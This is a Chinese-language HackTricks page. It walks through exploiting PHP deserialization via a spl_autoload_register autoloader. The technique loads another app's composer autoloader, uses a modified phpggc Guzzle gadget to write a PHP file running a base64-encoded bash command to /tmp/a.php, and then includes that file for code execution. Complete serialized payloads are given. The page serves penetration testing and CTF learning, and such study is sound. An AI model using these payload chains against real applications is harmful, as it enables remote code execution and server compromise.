# PHP - 反序列化 + 自动加载类

<details>

<summary><strong>从零到英雄学习AWS黑客技术，参加</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

首先，您应该了解什么是[**自动加载类**](https://www.php.net/manual/en/language.oop5.autoload.php)。

## PHP反序列化 + spl\_autoload\_register + LFI/小工具

我们处于这样一种情况：我们在一个**web应用程序中发现了PHP反序列化**，但在**`phpggc`**中没有任何易受小工具攻击的库。然而，在同一个容器中有一个**带有易受攻击库的不同composer web应用程序**。因此，目标是**加载其他web应用程序的composer加载器**，并利用它来**加载一个小工具，该小工具将利用带有小工具的库来攻击易受反序列化攻击的web应用程序**。

步骤：

* 您已经发现了一个**反序列化**，并且在当前应用程序代码中**没有任何小工具**
* 您可以滥用类似以下的**`spl_autoload_register`**函数来**加载任何带有`.php`扩展名的本地文件**
* 为此，您使用一个反序列化，其中类名将在**`$name`**中。在序列化对象中，您**不能在类名中使用"/"或"."**，但是**代码**正在**替换**下划线（"\_"）**为斜杠**（"/"）。因此，像`tmp_passwd`这样的类名将被转换为`/tmp/passwd.php`，代码将尝试加载它。\
一个**小工具示例**将是：**`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
如果你有一个**文件上传**功能，并且可以上传一个带有**`.php`扩展名**的文件，你可以**直接滥用这个功能**并且立即获得RCE。
{% endhint %}

在我的案例中，我没有这样的功能，但在**同一个容器**内有另一个composer网页，其中有一个对`phpggc`小工具**易受攻击的库**。

* 要加载这个其他库，首先你需要**加载那个其他web应用的composer加载器**（因为当前应用的加载器无法访问另一个应用的库。）**知道应用的路径**，你可以很容易地通过：**`O:28:"www_frontend_vendor_autoload":0:{}`** 来实现这一点（在我的案例中，composer加载器在`/www/frontend/vendor/autoload.php`）
* 现在，你可以**加载**其他**应用的composer加载器**，所以是时候**`生成phpggc`** **有效载荷**了。在我的案例中，我使用了**`Guzzle/FW1`**，它允许我**在文件系统内写入任何文件**。
* 注意：**生成的小工具不起作用**，为了让它起作用，我**修改了**phpggc的**`chain.php`**有效载荷，并将类的**所有属性**从private改为public。如果不这样做，在反序列化字符串后，创建的对象的属性将没有任何值。
* 现在我们有方法**加载其他应用的composer加载器**并且有一个**有效的phpggc有效载荷**，但我们需要**在同一个请求中做到这一点，以便在使用小工具时加载器被加载**。为此，我发送了一个包含两个对象的序列化数组，如下：
* 你可以看到**首先加载了加载器，然后是有效载荷**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* 现在，我们可以**创建并写入文件**，但是用户**无法在Web服务器内的任何文件夹中写入**。因此，如您在有效载荷中看到的，PHP调用**`system`**并创建了一些**base64**，在**`/tmp/a.php`**中生成。然后，我们可以**重用我们之前用作LFI的第一种类型的有效载荷**，来加载另一个webapp的composer加载器，**以加载生成的`/tmp/a.php`**文件。只需将其添加到反序列化小工具中：

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**有效载荷总结**

* **加载不同 web 应用程序的 composer 自动加载器**，这些应用程序位于同一容器中
* **加载 phpggc 小工具**，以滥用其他 web 应用程序的库（最初易受反序列化攻击的 web 应用程序其库中没有任何小工具）
* 小工具将在 /tmp/a.php 中**创建一个包含 PHP 有效载荷的文件**，其中包含恶意命令（web 应用程序用户无法在任何 web 应用程序的任何文件夹中写入）
* 我们有效载荷的最后部分将使用**加载生成的 php 文件**，该文件将执行命令

我需要**两次调用这个反序列化**。在我的测试中，第一次创建了 `/tmp/a.php` 文件，但没有加载，第二次则正确加载了。

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方的 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
